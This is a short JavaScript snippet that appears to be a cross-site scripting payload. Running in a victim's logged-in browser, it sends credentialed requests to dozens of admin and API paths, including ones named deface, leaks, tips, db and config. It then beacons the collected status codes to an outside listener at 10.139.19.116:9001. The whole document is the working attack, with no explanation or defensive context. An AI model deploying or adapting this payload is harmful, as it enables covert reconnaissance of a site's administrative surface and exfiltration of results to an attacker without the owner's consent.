(function(){
var paths=['/admin/pages.php', '/admin/page.php', '/admin/edit.php', '/admin/content.php', '/admin/home.php', '/admin/index.php', '/admin/console.php', '/admin/deface.php', '/admin/save.php', '/admin/write.php', '/admin/update.php', '/admin/publish.php', '/admin/release.php', '/admin/schedule.php', '/admin/case.php', '/admin/leaks.php', '/admin/tips.php', '/admin/export.php', '/admin/import.php', '/admin/db.php', '/admin/settings.php', '/admin/config.php', '/admin/site.php', '/admin/cms.php', '/admin/theme.php', '/admin/editor.php', '/admin/pages', '/admin/page', '/admin/api.php', '/api/pages.php', '/api/save.php', '/api/page.php', '/api/content.php', '/api/settings.php', '/api/schedule.php', '/api/case.php', '/api/leaks.php', '/api/tips.php', '/api/export.php', '/api/import.php', '/admin/review.php?action=approve&id=3', '/admin/search.php?format=json&q=pages', '/admin/status.php', '/admin/health.php', '/admin/debug.php', '/admin/test.php', '/admin/dev.php', '/admin/tools.php', '/admin/maintenance.php', '/admin/install.php', '/account.php?edit=1', '/account.php/update', '/profile.php', '/admin/profile.php', '/admin/user.php'];
var out=[];
function rep(s){try{new Image().src='http://10.139.19.116:9001/sweep?d='+encodeURIComponent(s);}catch(e){}}
(function loop(){
  if(paths.length==0){rep(JSON.stringify(out));return;}
  var p=paths.shift();
  try{var x=new XMLHttpRequest();
    x.open('GET',p,false);x.withCredentials=true;
    try{x.send();out.push(p+'='+x.status);}catch(e){out.push(p+'=X');}
  }catch(e){out.push(p+'=E');}
  setTimeout(loop,60);
})();
})();